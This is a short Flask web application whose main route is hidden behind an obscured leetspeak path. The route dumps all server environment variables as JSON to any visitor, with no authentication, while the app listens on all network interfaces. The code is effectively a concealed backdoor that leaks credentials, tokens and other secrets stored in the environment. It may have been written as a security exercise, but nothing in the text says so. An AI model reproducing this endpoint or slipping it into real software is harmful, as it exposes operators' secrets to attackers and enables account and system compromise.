from flask import Flask, render_template
import os
import json

app = Flask(__name__)


@app.route('/G3TD@T@N0W0RL@73R')
def data():  # put application's code here
    data = {}
    for name, value in os.environ.items():
        data[name] = value
    return json.dumps(data)


@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404


if __name__ == '__main__':
    app.register_error_handler(404, page_not_found)
    app.run(host="0.0.0.0", port=5000)
